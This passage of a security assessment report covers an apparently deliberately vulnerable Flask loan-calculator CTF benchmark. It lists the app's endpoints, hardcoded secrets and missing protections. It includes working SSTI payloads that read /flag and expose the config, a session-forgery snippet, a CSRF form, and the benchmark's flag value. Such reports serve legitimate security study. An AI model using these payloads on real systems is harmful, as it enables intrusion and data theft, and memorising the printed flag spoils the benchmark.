7. Cookie transmission: Set-Cookie: session=<base64_data>.<timestamp>.<signature> (HTTP, no Secure flag)
```

**Security Failures in This Flow:**
- **Transport:** HTTP transmission exposes passwords in cleartext during network transit
- **Storage:** Passwords stored in plaintext in database.users.password column
- **Comparison:** Direct string comparison enables timing attacks (though moot with plaintext storage)
- **Session Security:** Weak secret key enables session forgery, bypassing need for credentials

**Profile Data Flow (PII Exposure):**

**File:** `routes.py` (Lines 61-67)

```python
user.name = request.form['name']
user.lastname = request.form['lastname']
user.email = request.form['email']
user.loan_amount = float(request.form['loan_amount'])
user.loan_term_months = int(request.form['loan_term_months'])
user.monthly_payment = float(request.form['monthly_payment'])
db.session.commit()
```

This profile update flow demonstrates multiple security gaps:

1. **No Input Validation:** Direct assignment from form fields without length limits, format validation, or sanitization. Users could inject 10,000-character names, invalid email formats, or negative loan amounts.

2. **No CSRF Protection:** The POST /profile endpoint lacks CSRF tokens. Attackers can craft malicious forms on external websites that submit profile changes when victims visit:
```html
<form action="http://target-app/profile" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit" value="Win Prize!">
</form>
```

3. **Mass Assignment Risk:** All six profile fields are directly modifiable. No field-level access controls prevent users from manipulating calculated values like `monthly_payment`, potentially breaking business logic.

4. **No Data Encryption:** PII (name, lastname, email) and financial data (loan_amount, monthly_payment) are stored in plaintext database columns. Database compromise exposes all sensitive data.

**Loan Calculation Data Flow (SSTI VULNERABILITY):**

**File:** `routes.py` (Lines 94-108)

```python
principal = request.args.get('principal', type=str)  # User-controlled STRING
payment = request.args.get('payment', type=float)
term = request.args.get('term', type=int)

json_template = f"""
{{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", ... }}
"""  # SSTI: principal injected into f-string before template rendering

return render_template_string(json_template, payment=payment, term=term)
```

This flow represents the application's most critical vulnerability. The `principal` parameter flows directly from user input (GET query parameter) into an f-string that constructs a Jinja2 template, then passes to `render_template_string()`. This double-rendering creates Server-Side Template Injection:

**Exploitation Flow:**
```
1. Attacker sends: GET /total_loan_payments?principal={{7*7}}&payment=100&term=12
2. F-string interpolation: json_template = '{ "loan_principal": "{{7*7}}" ,... }'
3. render_template_string() evaluates: {{7*7}} → 49
4. Response: { "loan_principal": "49" ,... }  (Code execution confirmed)
```

**Advanced Exploitation (Flag Extraction):**
```python
# Payload: principal={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
# Result: Reads /flag file, returns flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}
```

### Multi-Tenant Data Isolation - Not Applicable

The application follows a single-tenant architecture where each deployment serves one organization. Users are isolated by `user_id` at the application layer, but this is user-level isolation, not tenant-level. No tenant_id, organization_id, or schema-per-tenant patterns exist.

**Security Implication for User Isolation:**

Even in single-tenant context, user isolation is weak due to session forgery vulnerability. The pattern `user = User.query.get(user_id)` retrieves data based on session content. Since sessions can be forged with the known secret key, user isolation is cryptographically broken. An attacker can access any user's data by forging a session with the target user_id:

**Horizontal Privilege Escalation:**
```python
# Forge session for user_id=5
forged_cookie = session_serializer.dumps({'user_id': 5})
# Access /profile with forged cookie
# View and modify user_id=5's PII and loan data
```

**No row-level security exists in MySQL.** Queries like `User.query.get(user_id)` rely entirely on the application layer to provide correct user_id values. Database-level isolation (e.g., MySQL 8.0 roles, views with WHERE clauses) is not implemented.

---

## 5. Attack Surface Analysis

### External Entry Points - Network-Accessible HTTP Endpoints

The application exposes **7 HTTP endpoints** on port 80, divided into public (unauthenticated) and protected (session-required) categories. All endpoints accept form data or query parameters without rate limiting, CSRF protection, or comprehensive input validation.

**Public Endpoints (No Authentication Required):**

1. **`GET /`** - Root Redirect
   - **File:** `routes.py` (Lines 16-18)
   - **Functionality:** Redirects to `/login` using `url_for('login')`
   - **Security Assessment:** Low risk - no sensitive data, no user input processing
   - **Attack Relevance:** None (redirect only)

2. **`GET /login`** - Login Page Render
   - **File:** `routes.py` (Line 32)
   - **Functionality:** Renders login HTML form
   - **Input:** None (page render only)
   - **Attack Surface:** Potential phishing page hosting if HTML can be injected via other vectors

3. **`POST /login`** - Authentication Submission
   - **File:** `routes.py` (Lines 20-34)
   - **Functionality:** Processes authentication credentials
   - **Input Parameters:**
     - `username` (form field, text)
     - `password` (form field, text)
   - **Authentication Logic:** Plaintext password comparison via `User.query.filter_by(username=username, password=password).first()`
   - **Response:** Redirect to `/home` on success, render error message on failure
   
   **Security Assessment - HIGH RISK:**
   - **No Rate Limiting:** Enables username/password brute force attacks. Attackers can attempt thousands of authentication requests without throttling.
   - **Username Enumeration:** Different responses for invalid username vs. invalid password (though current code shows identical error message, timing differences may reveal valid usernames)
   - **No Account Lockout:** Unlimited authentication attempts allowed
   - **No CAPTCHA:** Automated attacks face no challenge-response barriers
   - **Timing Attack Potential:** Plaintext string comparison may leak information through timing side channels
   - **Default Credentials:** Hardcoded `test:test` account provides immediate access
   
   **Attack Vectors:**
   - Credential stuffing using leaked password databases
   - Brute force enumeration of common username/password combinations
   - Timing attacks to identify valid usernames
   - Authentication bypass via session forgery (doesn't require /login endpoint)

**Protected Endpoints (Session-Based Authentication Required):**

All protected endpoints check `session.get('user_id')` and redirect to `/login` if absent. However, session authentication is bypassable via secret key knowledge, making these "protected" in name only.

4. **`GET /logout`** - Session Termination
   - **File:** `routes.py` (Lines 36-40)
   - **Functionality:** Clears `user_id` from session, redirects to login
   - **Security Assessment:** LOW RISK
   - **Vulnerability:** No CSRF protection enables logout CSRF (minor impact)

5. **`GET /home`** - User Dashboard
   - **File:** `routes.py` (Lines 42-51)
   - **Functionality:** Displays user profile summary with welcome message
   - **Input:** Session user_id (implicit)
   - **Data Exposure:** Name, lastname displayed in HTML
   - **Security Assessment:** MEDIUM RISK (IDOR potential via session forgery)

6. **`GET /profile` and `POST /profile`** - Profile Management
   - **File:** `routes.py` (Lines 53-74)
   - **GET Functionality:** Renders profile edit form with current user data
   - **POST Functionality:** Updates user profile fields
   
   **POST Input Parameters:**
   - `name` (form field, text) - First name
   - `lastname` (form field, text) - Last name
   - `email` (form field, text) - Email address
   - `loan_amount` (form field, numeric) - Loan principal
   - `loan_term_months` (form field, integer) - Loan duration
   - `monthly_payment` (form field, numeric) - Payment amount
   
   **Security Assessment - HIGH RISK:**
   - **No CSRF Protection:** Enables cross-site profile modification attacks
   - **No Input Validation:** 
     - No maximum length on text fields (potential DoS via large strings)
     - No email format validation (can store invalid emails)
     - No numeric range validation (negative loan amounts accepted)
   - **Mass Assignment:** All profile fields directly modifiable, including calculated financial data
   - **Type Coercion Errors:** `float()` and `int()` conversions lack try/catch blocks, causing 500 errors on invalid input
   - **No Field-Level Access Control:** Users can modify financial fields that should be read-only
   
   **Attack Vectors:**
   - CSRF attacks to modify victim profiles
   - Business logic bypass by manually setting monthly_payment to $0
   - Input validation bypass to inject malformed data
   - Database storage exhaustion via extremely long string values

7. **`GET /loan_details`** - Loan Information Display
   - **File:** `routes.py` (Lines 76-86)
   - **Functionality:** Renders loan details page with financial summary
   - **Input:** Session user_id (implicit)
   - **Data Exposure:** loan_amount, loan_term_months, monthly_payment
   - **Security Assessment:** LOW RISK (read-only view)

8. **`GET /total_loan_payments`** - Loan Calculator API (CRITICAL VULNERABILITY)
   - **File:** `routes.py` (Lines 88-112)
   - **Functionality:** Calculates total loan payments and returns JSON response
   
   **Input Parameters (Query String):**
   - `principal` (string, REQUIRED) - **VULNERABLE:** Unsanitized template injection point
   - `payment` (float, REQUIRED) - Monthly payment amount
   - `term` (integer, REQUIRED) - Loan term in months
   
   **Security Assessment - CRITICAL RISK (REMOTE CODE EXECUTION):**
   
   This endpoint contains the application's most severe vulnerability: **Server-Side Template Injection (SSTI)**. The `principal` parameter is retrieved as a string, directly interpolated into an f-string that constructs a Jinja2 template, then passed to `render_template_string()`. This creates a double-rendering condition where attacker-controlled Jinja2 expressions are evaluated server-side.
   
   **Vulnerability Code (Lines 103-108):**
   ```python
   json_template = f"""
   {{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", ... }}
   """
   return render_template_string(json_template, payment=payment, term=term)
   ```
   
   **Exploitation:**
   ```
   GET /total_loan_payments?principal={{7*7}}&payment=100&term=12
   Response: { "loan_principal": "49" ,... }  # RCE confirmed
   
   GET /total_loan_payments?principal={{config}}&payment=1&term=1
   Response: Exposes Flask configuration including secret_key
   
   GET /total_loan_payments?principal={{''.__class__.__mro__[1].__subclasses__()[414]('/flag').read()}}&payment=1&term=1
   Response: Reads /flag file, returns CTF flag
   ```
   
   **Impact:**
   - **Remote Code Execution:** Arbitrary Python code execution with application privileges
   - **File System Access:** Read sensitive files (/flag, /etc/passwd, application source)
   - **Configuration Exposure:** Extract database credentials, secret keys
   - **Command Execution:** Execute OS commands via subprocess or os modules
   - **Lateral Movement:** Access internal Docker network services
   - **Complete System Compromise:** Full control over application container
   
   **Authentication Requirement:** YES - requires valid session (obtainable via test:test login or session forgery)
   
   **Attack Prerequisites:**
   1. Authenticate to obtain valid session (test:test credentials)
   2. OR forge session cookie using known secret key
   3. Send crafted GET request to /total_loan_payments with malicious principal parameter
   
   **Defense Evasion:** None required - no WAF, no input filtering, no SSTI detection mechanisms exist

### Internal Service Communication - Docker Network Isolation

The application architecture consists of two Docker containers communicating via an internal Docker network:

**Service Communication Map:**
```
web (Flask/Apache) ←→ db (MySQL)
    ↑
    └─ Connection: mysql+pymysql://root:loan_calculator@db:3306/database
       Protocol: MySQL protocol (TCP 3306)
       Encryption: None (plaintext)
       Authentication: Username/password (root:loan_calculator)
```

**Trust Relationships:**

1. **Flask → MySQL:** The Flask application fully trusts the database. All data returned from queries is assumed valid. No input validation occurs on data retrieved from the database before rendering in templates.

2. **No Mutual TLS:** Services authenticate via username/password only. No certificate-based authentication.

3. **Implicit Trust Boundary:** Docker network segmentation provides the only isolation. If the web container is compromised (SSTI vulnerability), attackers gain network access to MySQL on port 3306.

**Security Implications:**

- **Database Exposed After Container Compromise:** The SSTI vulnerability provides full access to the web container. From there, attackers can connect directly to MySQL using the hardcoded credentials.
- **No Defense in Depth:** No additional authentication layers exist between compromised application and database.
- **Lateral Movement Path:** Web container compromise → database access → credential extraction → potential pivot to other services if database credentials are reused

### Input Validation Patterns - Weak and Inconsistent

**Form Input Handling (Profile Update Example):**

**File:** `routes.py` (Lines 61-66)
```python
user.name = request.form['name']                              # No validation
user.lastname = request.form['lastname']                      # No validation
user.email = request.form['email']                            # No email format check
user.loan_amount = float(request.form['loan_amount'])        # Type coercion only
user.loan_term_months = int(request.form['loan_term_months']) # Type coercion only
user.monthly_payment = float(request.form['monthly_payment']) # Type coercion only
```

**Validation Failures:**

1. **No Length Limits:** Text fields have database column limits (String(50), String(100)) but no application-layer validation. Users can submit 10,000-character strings that get truncated, causing data loss and potential SQL truncation attacks.

2. **No Format Validation:** Email field accepts any string (e.g., "not_an_email", "admin@", "test") without regex validation or format checking.

3. **No Numeric Range Validation:** Financial fields accept any numeric value including:
   - Negative loan amounts (loan_amount=-100000)
   - Zero or negative loan terms (loan_term_months=0)
   - Negative monthly payments (monthly_payment=-500)

4. **Type Coercion Without Error Handling:** Calling `float()` or `int()` on invalid input raises ValueError, causing 500 Internal Server Error and exposing stack traces in debug mode.

**Query Parameter Handling (SSTI Endpoint):**

**File:** `routes.py` (Lines 94-96)
```python
principal = request.args.get('principal', type=str)  # NO VALIDATION
payment = request.args.get('payment', type=float)
term = request.args.get('term', type=int)
```

The `principal` parameter demonstrates catastrophic validation failure. Accepting `type=str` allows arbitrary string input including Jinja2 template syntax. No sanitization, escaping, or validation occurs before interpolation into the template.

**Attack Surface Summary:**

| Endpoint | Input Type | Validation | Attack Vector |
|----------|-----------|------------|---------------|
| POST /login | Form (username, password) | None | Brute force, credential stuffing |
| POST /profile | Form (6 fields) | Type coercion only | CSRF, mass assignment, invalid data |
| GET /total_loan_payments | Query (principal, payment, term) | None on principal | SSTI → RCE |

### Background Processing - Not Applicable

No asynchronous job processing, message queues, or background workers exist. All request processing is synchronous within the Flask request-response cycle. No Celery, Redis Queue, or similar task systems are present in requirements.txt or application code.

**Security Implication:** The absence of background processing eliminates a common attack surface (deserialization of queued jobs, privilege escalation through worker processes) but also means all processing occurs in-request, making DoS attacks more effective (no rate limiting to protect synchronous handlers).

---

## 6. Infrastructure & Operational Security

### Secrets Management - Critical Failures Across All Layers

**Hardcoded Secrets Inventory:**

1. **Flask Session Secret Key**
   - **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Line 8)
   - **Value:** `'your_secret_key'`
   - **Usage:** HMAC-SHA1 signing of session cookies
   - **Impact:** Session forgery, authentication bypass, privilege escalation
   - **Comment in Code:** "Change this to a secure secret key" (ignored)

2. **MySQL Root Password**
   - **Location 1:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/mysql/Dockerfile` (Line 3)
     ```dockerfile
     ENV MYSQL_ROOT_PASSWORD=loan_calculator
     ```
   - **Location 2:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Line 11)
     ```python
     'mysql+pymysql://root:loan_calculator@db/database'
     ```
   - **Location 3:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/docker-compose.yml` (Line 7)
     ```yaml
     test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost","--password=loan_calculator","-u","root"]
     ```
   - **Value:** `loan_calculator` (single dictionary word, no complexity)
   - **Impact:** Database full administrative access, data exfiltration, data destruction

3. **Default User Credentials**
   - **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Lines 23-32)
   - **Username:** `test`
   - **Password:** `test` (plaintext in code and database)
   - **Impact:** Immediate authenticated access, SSTI exploitation, flag capture

4. **CTF Flag**
   - **Location 1:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/.env` (Line 1)
     ```
     FLAG="flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}"
     ```
   - **Location 2:** Container filesystem `/flag` (written during Docker build)
   - **Exposure:** Committed to version control, stored in container image layers

**Secrets Management Best Practices Violations:**

- **No Environment Variable Usage:** Secrets hardcoded in source files instead of reading from ENV at runtime
- **No Secret Rotation:** Static secrets with no rotation mechanism
- **Version Control Exposure:** All secrets committed to git, visible in commit history
- **No Encryption at Rest:** Secrets stored in plaintext in Dockerfiles and Python source
- **No Secrets Scanning:** No pre-commit hooks or CI/CD checks to prevent secret commits
- **No External Secret Management:** No HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or Kubernetes Secrets usage

**Recommended Remediation:**
```python
# SECURE ALTERNATIVE (Not Implemented):
import os
import secrets

# Generate strong random secret key at deployment
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)

# Database credentials from environment
db_user = os.environ['DB_USER']
db_pass = os.environ['DB_PASSWORD']
db_host = os.environ['DB_HOST']
app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{db_user}:{db_pass}@{db_host}/database?ssl_ca=/path/to/ca.pem'
```

### Configuration Security - Environment Separation and Secret Handling

**Single Configuration File - No Environment Separation:**

The application uses a single configuration in `__init__.py` with no differentiation between development, staging, and production environments. No `config.py` with Development/Production classes exists. Flask's `ENV` and `DEBUG` variables are not explicitly set, meaning Flask defaults apply.

**Configuration Files:**

1. **Flask Application Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py`
   - Lines 8-12: Secret key, database URI, SQLAlchemy settings
   - No environment-based conditional configuration

2. **Apache Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/loan_calculator-httpd.conf`
   - Line 11: CORS wildcard configuration
   - Lines 3-18: VirtualHost, WSGI, and directory settings

3. **Docker Compose Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/docker-compose.yml`
   - Database credentials in health check
   - Build-time FLAG argument
   - Port mapping configuration

**Debug Mode Status - Uncertain but Likely Disabled:**

No explicit `app.debug = True` or `FLASK_ENV=development` configuration found. Flask defaults to debug=False in production. However, the absence of explicit configuration means debug mode status is ambiguous. If debug mode is accidentally enabled:
- **Stack Traces Exposed:** Detailed error pages reveal source code paths, variable values
- **Automatic Reloader:** File changes trigger app restarts (DoS vector)
- **Werkzeug Debugger:** Interactive Python console accessible via browser (RCE)

### External Dependencies - Third-Party Services and Security Implications

**Python Package Dependencies:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/requirements.txt`
```
flask
flask_sqlalchemy
pymysql
```

**Dependency Security Analysis:**

1. **No Version Pinning - CRITICAL RISK:**
   - All dependencies lack version constraints (should be `flask==3.0.0`, not `flask`)
   - Deployments could install any version, including known vulnerable versions
   - No `requirements.lock` or `Pipfile.lock` for reproducible builds
   - Supply chain attack risk if PyPI packages are compromised

2. **Known Vulnerabilities in Common Versions:**
   - Flask < 2.3.0: Multiple CVEs including session handling issues
   - PyMySQL: No major recent CVEs, but version uncertainty is problematic
   - Flask-SQLAlchemy: SQL injection risks in older versions with raw queries

3. **Missing Security Dependencies:**
   - No `flask-talisman` (security headers)
   - No `flask-limiter` (rate limiting)
   - No `flask-wtf` (CSRF protection)
   - No `bcrypt` or `argon2-cffi` (password hashing)
   - No `cryptography` (encryption)

**Frontend Dependencies:**

**Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/js/jquery.min.js` - jQuery 3.6.0
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/js/bootstrap.bundle.min.js` - Bootstrap 5.3.0

**Security Issues:**
- **jQuery 3.6.0:** Contains known XSS vulnerabilities (CVE-2020-11022, CVE-2020-11023) related to htmlPrefilter. While mitigated in many contexts, specific use patterns can trigger vulnerabilities.
- **Bootstrap 5.3.0:** Current version, no known major security issues

**External Service Integrations:** NONE

No external APIs, payment processors, analytics services, or third-party integrations detected. The application is self-contained with no outbound HTTP requests to external services.

**Security Implication:** Reduces external attack surface (no SSRF to external services, no third-party data leakage) but also eliminates external security features like centralized authentication (OAuth) or managed secrets.

### Monitoring & Logging - Minimal Visibility

**Application-Level Logging:** NOT IMPLEMENTED

No explicit logging configuration exists in the application code. Flask's default logging (Werkzeug) captures HTTP access logs but provides minimal security event visibility:
- No authentication failure logging
- No authorization violation logging
- No SSTI attack attempt detection
- No suspicious parameter logging

**Apache Access Logs:**

Apache logs HTTP requests to standard output (Docker container logs). These logs capture:
- Request method, path, and response code
- Client IP addresses (Docker network IPs, not real client IPs without reverse proxy)
- User agents and referrers

**Critical Logging Gaps:**

1. **No Security Event Logging:**
   - Authentication failures not logged with username (generic error page returned)
   - No failed authorization attempt logging
   - No input validation failure logging
   - No rate limiting violation logs (no rate limiting exists)

2. **No Anomaly Detection:**
   - No detection of SSTI payloads in parameters
   - No detection of SQL injection attempts
   - No detection of abnormal session patterns
   - No detection of brute force attacks

3. **No Log Aggregation:**
   - Logs remain in Docker containers (ephemeral)
   - No centralized logging (ELK stack, Splunk, CloudWatch)
   - Container restart wipes logs

4. **Sensitive Data in Logs:**
   - Apache access logs may contain sensitive data in URL parameters
   - `/total_loan_payments?principal={{7*7}}` appears in access logs, revealing SSTI attempts
   - Query parameters with PII may be logged

**Infrastructure Security Headers:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/loan_calculator-httpd.conf`

**Search for Security Headers:** No Nginx configuration found. Apache is the sole web server. No explicit HSTS, CSP, or other security header configuration exists in `httpd.conf`.

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` (Lines 8-14)

```python
@app.after_request
def add_header(request):  # BUG: Should be 'response', not 'request'
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'  # Contradicts previous line
    return request
```

**Critical Bug:** This function attempts to modify the `request` object instead of `response` object. Flask passes the response object to `@app.after_request` hooks. This code likely has no effect due to parameter naming error.

**Missing Security Headers:**

| Header | Purpose | Impact of Absence |
|--------|---------|-------------------|
| Strict-Transport-Security (HSTS) | Force HTTPS | Sessions transmitted over HTTP, MITM attacks |
| Content-Security-Policy (CSP) | XSS mitigation | No defense-in-depth against XSS |
| X-Frame-Options | Clickjacking prevention | Application can be iframed by malicious sites |
| X-Content-Type-Options | MIME sniffing prevention | Browsers may execute non-JS files as scripts |
| X-XSS-Protection | Legacy XSS filter | No browser-level XSS protection (deprecated but harmless) |
| Referrer-Policy | Referrer information control | Sensitive data in URLs may leak via Referrer |
| Permissions-Policy | Feature control | No restriction on browser features |

**Cache-Control Configuration:** Intended to prevent caching but implementation is broken (modifies request instead of response). If functional, would prevent browser caching of sensitive data, which is security-positive.

---

## 7. Overall Codebase Indexing

### Codebase Structure and Organization

The application follows a standard Flask project structure with clear separation between configuration, application logic, templates, and static assets. The codebase is compact (approximately 800KB total, 167 lines of Python application code) and easy to navigate, suggesting it was designed as a security training challenge rather than a production application.

**Root Directory Structure:**

```
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/
├── .env                                    # Environment variables (FLAG definition)
├── .xben_build_done                        # Build completion marker
├── benchmark.json                          # Challenge metadata
├── docker-compose.yml                      # Container orchestration
├── Makefile                                # Build automation (references external common.mk)
├── app/                                    # Application container
│   ├── Dockerfile                         # Application image definition
│   ├── loan_calculator-httpd.conf         # Apache VirtualHost configuration
│   └── website/                           # Flask application root
│       ├── requirements.txt               # Python dependencies (3 packages)
│       ├── loan_calculator.wsgi           # WSGI entry point
│       ├── run.py                         # Development server (local-only, out-of-scope)
│       └── app/                           # Application package
│           ├── __init__.py                # Flask app initialization, DB config
│           ├── routes.py                  # Route handlers (all 7 endpoints)
│           ├── models.py                  # SQLAlchemy User model
│           ├── db.py                      # SQLAlchemy instance
│           ├── templates/                 # Jinja2 HTML templates
│           │   ├── login.html             # Login form
│           │   ├── home.html              # User dashboard
│           │   ├── profile.html           # Profile edit form
│           │   └── loan_details.html      # Loan summary with JavaScript
│           └── static/                    # Frontend assets
│               ├── css/
│               │   ├── bootstrap.min.css  # Bootstrap 5.3.0 (375KB)
│               │   └── style.css          # Custom styles (3KB)
│               └── js/
│                   ├── bootstrap.bundle.min.js  # Bootstrap JS (79KB)
│                   └── jquery.min.js            # jQuery 3.6.0 (89KB)
└── mysql/                                 # Database container
    └── Dockerfile                         # MySQL 5.7.15 image with credentials
```

**Application Package Organization (app/website/app/):**

The `app/` package contains 4 Python modules totaling 167 lines of code:

1. **`__init__.py` (34 lines):** Flask application factory pattern with initialization logic
   - Flask app instantiation
   - Secret key configuration (HARDCODED)
   - Database connection setup (HARDCODED CREDENTIALS)
   - SQLAlchemy initialization
   - Test user creation with db.session operations
   - Routes import to register endpoints

2. **`routes.py` (112 lines):** All HTTP endpoint handlers and request processing logic
   - Broken `@app.after_request` hook for headers
   - 7 route handlers (/, /login, /logout, /home, /profile, /loan_details, /total_loan_payments)
   - SSTI vulnerability in /total_loan_payments handler
   - Manual session-based authorization checks (repetitive pattern)

3. **`models.py` (15 lines):** SQLAlchemy data model definition
   - Single User model with 10 columns
   - Plaintext password column (String(50))
   - PII fields (name, lastname, email)
   - Financial data fields (loan_amount, loan_term_months, monthly_payment)

4. **`db.py` (6 lines):** SQLAlchemy instance creation
   - Creates `db = SQLAlchemy()` object
   - Simple module for circular import prevention

**Infrastructure Configuration Files:**

1. **`docker-compose.yml` (29 lines):** Orchestrates 2 services
   - `db` service: MySQL 5.7.15 with health check containing password
   - `web` service: Flask application with FLAG build argument and port 80 exposure
   - Services connected via Docker internal network

2. **`app/Dockerfile` (25 lines):** Multi-stage application container build
   - Base: debian:bullseye-slim
   - Installs: apache2, libapache2-mod-wsgi-py3, python3, python3-pip, curl
   - Copies application code to /var/www/loan_calculator/
   - **CRITICAL:** Writes FLAG to /flag file (line 21: `RUN echo -n $FLAG > /flag`)
   - Enables Apache modules and custom configuration
   - Exposes port 80, runs Apache in foreground

3. **`mysql/Dockerfile` (4 lines):** Database container with hardcoded credentials
   - Base: mysql:5.7.15 (EOL, vulnerable)
   - ENV MYSQL_ROOT_PASSWORD=loan_calculator
   - ENV MYSQL_DATABASE=database

4. **`app/loan_calculator-httpd.conf` (18 lines):** Apache VirtualHost configuration
   - ServerName: loan_calculator
   - DocumentRoot: /var/www/loan_calculator/
   - **CRITICAL:** `Header set Access-Control-Allow-Origin "*"` (wildcard CORS)
   - **SECURITY ISSUE:** `Options Indexes FollowSymLinks` (directory listing enabled)
   - WSGIScriptAlias: /loan_calculator.wsgi mounted at /

**Frontend Organization:**

Templates use Bootstrap 5.3.0 for responsive UI with jQuery 3.6.0 for AJAX functionality. The structure is straightforward:
- `login.html`: Bootstrap form with username/password fields, no CSRF token
- `home.html`: Welcome message with user PII displayed
- `profile.html`: Bootstrap form with 6 input fields for profile editing, no CSRF token
- `loan_details.html`: Display page with embedded JavaScript for AJAX call to /total_loan_payments

**Code Generation and Build Tools:**

The `Makefile` references an external `../common.mk` file not present in the repository. This suggests the application is part of a larger CTF challenge framework. The presence of `benchmark.json` and `.xben_build_done` marker confirms this is an XBEN challenge series component.

**Discoverability of Security Components:**

**Positive Indicators:**
- Centralized route definitions in single `routes.py` file makes endpoint discovery straightforward
- Single User model in `models.py` makes data schema clear
- No code obfuscation or complex layering

**Negative Indicators:**
- No dedicated security module (no `auth.py`, `security.py`, or `middleware.py`)
- Security controls mixed with business logic in route handlers
- No centralized input validation (validation scattered across routes)
- No dedicated configuration management (config mixed in `__init__.py`)
- Missing security-focused Flask extensions make security controls harder to audit

**Impact on Security Analysis:**

The compact, straightforward structure makes vulnerability discovery efficient. Critical security flaws are easily identifiable:
- Hardcoded secrets are immediately visible in `__init__.py` and Dockerfiles
- SSTI vulnerability is obvious in `routes.py` lines 103-108 due to `render_template_string()` with user input
- Plaintext password storage is clear from `models.py` String(50) column and authentication logic in `routes.py`

The lack of defense-in-depth architecture (no security middleware layer, no input validation framework, no authentication decorators) means security relies entirely on correct implementation in each route handler. The repetitive manual authorization pattern (`if session.get('user_id')`) in each endpoint is error-prone and suggests no centralized security enforcement.

---

## 8. Critical File Paths

### Configuration Files

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/.env` - CTF flag definition
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/docker-compose.yml` - Container orchestration, database health check with password
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/Dockerfile` - Application container build with FLAG injection (line 21)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/mysql/Dockerfile` - Database container with hardcoded root password (line 3)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/loan_calculator-httpd.conf` - Apache configuration with CORS wildcard (line 11) and directory indexing (line 15)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/benchmark.json` - Challenge metadata

### Authentication & Authorization

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` - Flask secret key (line 8), database credentials (line 11), test user creation (lines 23-32)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` - Login endpoint (lines 20-34), logout (lines 36-40), authorization checks (lines 45, 56, 79, 90)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/models.py` - User model with plaintext password column (line 9)

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` - All 7 HTTP endpoints
  - Root redirect (lines 16-18)
  - Login GET/POST (lines 20-34)
  - Logout GET (lines 36-40)
  - Home GET (lines 42-51)
  - Profile GET/POST (lines 53-74)
  - Loan details GET (lines 76-86)
  - **CRITICAL:** Total loan payments GET with SSTI vulnerability (lines 88-112, vulnerability at 103-108)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/loan_calculator.wsgi` - WSGI entry point

### Data Models & DB Interaction

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/models.py` - User model definition with PII and financial data fields
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/db.py` - SQLAlchemy instance
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` - Database connection configuration (line 11)

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/requirements.txt` - Python dependencies (flask, flask_sqlalchemy, pymysql) without version pinning

### Sensitive Data & Secrets Handling

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` - Flask secret key (line 8), database credentials (line 11), test user credentials (lines 23-32)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/.env` - CTF flag (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/mysql/Dockerfile` - MySQL root password (line 3)

### Middleware & Input Validation

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` - Broken header middleware (lines 8-14), profile update without validation (lines 61-66), SSTI vulnerability without input sanitization (lines 94-108)

### Logging & Monitoring

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/loan_calculator-httpd.conf` - Apache access log configuration (default, not explicitly configured)
- No application-level logging implementation found

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/docker-compose.yml` - Service orchestration
